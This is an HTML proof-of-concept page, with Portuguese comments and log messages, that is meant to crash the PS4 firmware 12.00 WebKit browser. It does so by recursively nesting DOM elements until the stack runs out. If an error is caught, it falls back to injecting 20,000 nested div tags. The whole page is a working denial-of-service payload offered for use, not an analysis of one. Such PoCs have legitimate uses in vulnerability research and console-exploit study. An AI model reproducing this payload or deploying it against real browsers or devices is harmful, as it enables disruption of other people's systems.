<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 DoS PoC</title>
    <style>
        body { font-family: monospace; padding: 20px; }
        button { font-size: 16px; padding: 10px; cursor: pointer; }
        #log { margin-top: 20px; border-top: 1px solid #000; padding-top: 10px; }
    </style>
</head>
<body>
    <h1>PS4 WebKit Stack Exhaustion (FW 12.00)</h1>
    <p>Click the button below to trigger the recursion bug.</p>
    
    <button onclick="startDOMRecursion()">TRIGGER CRASH</button>

    <div id="log">Status: Waiting for user input...</div>

    <script>
        function log(msg) {
            document.getElementById('log').innerText += "\n" + msg;
        }

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        // Adiciona texto para forçar renderização e layout calculation
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; // Desce um nível
                        
                        // Loga a cada 1000 para não travar a UI antes da hora
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); // Recursão
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    // Método fallback do seu script original
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }
    </script>
</body>
</html>
